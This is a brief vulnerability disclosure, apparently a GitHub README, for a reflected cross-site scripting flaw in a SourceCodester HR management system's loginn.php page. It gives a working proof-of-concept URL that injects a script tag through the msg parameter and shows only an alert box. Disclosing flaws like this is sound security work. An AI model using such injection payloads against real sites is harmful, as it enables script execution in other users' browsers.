# CVE-2022-46104
https://www.sourcecodester.com/

XSS has been discovered on Human Resource Management System Project loginn.php page:

![image](https://user-images.githubusercontent.com/123009127/213255477-6fec00b1-2343-482a-8c8a-2068911e1317.png)


Execution payload:

http://localhost/hrm/loginn.php?msg=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E

![image](https://user-images.githubusercontent.com/123009127/213255813-54148d02-7dbd-4fa7-8fc3-e39dd866f143.png)


![image](https://user-images.githubusercontent.com/123009127/213256166-5552035a-840e-423c-9759-1833413338c5.png)
